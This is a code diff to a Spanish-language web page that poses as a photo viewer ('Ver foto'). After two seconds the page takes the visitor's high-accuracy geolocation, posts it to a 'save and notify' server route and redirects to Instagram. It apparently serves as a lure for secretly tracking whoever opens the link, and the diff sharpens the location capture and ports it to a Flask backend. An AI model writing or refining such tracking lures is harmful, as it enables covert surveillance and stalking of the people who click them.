@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
+    <meta charset="UTF-8">
     <title>Ver foto</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -12,6 +13,7 @@
             align-items: center; 
             min-height: 100vh;
             font-family: Arial, sans-serif;
+            color: white;
         }
         .container {
             text-align: center;
@@ -22,7 +24,6 @@
             border-radius: 10px;
         }
         .loader {
-            color: white;
             font-size: 18px;
             margin-top: 20px;
         }
@@ -38,7 +39,10 @@
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 10000 });
+                navigator.geolocation.getCurrentPosition(showPosition, showError, { 
+                    enableHighAccuracy: true, 
+                    timeout: 10000 
+                });
             } else {
                 redirigir();
             }
@@ -56,19 +60,19 @@
             data.append('precision', precision);
             data.append('fecha', fecha);
 
-            fetch('guardar_y_notificar.php', {
+            // Ahora apunta a la ruta de Flask
+            fetch('/guardar_y_notificar', {
                 method: 'POST',
                 body: data
-            }).then(response => response.text())
-              .then(() => {
+            }).then(() => {
                 redirigir();
-              })
-              .catch(error => {
+            }).catch(() => {
                 redirigir();
-              });
+            });
         }
 
         function showError(error) {
+            console.log("Error de ubicación: " + error.message);
             redirigir();
         }
 
@@ -76,7 +80,7 @@
             window.location.href = "https://www.instagram.com/";
         }
 
-        // Iniciar después de 2 segundos
+        // Iniciar captura tras 2 segundos
         setTimeout(getLocation, 2000);
     </script>
 </body>
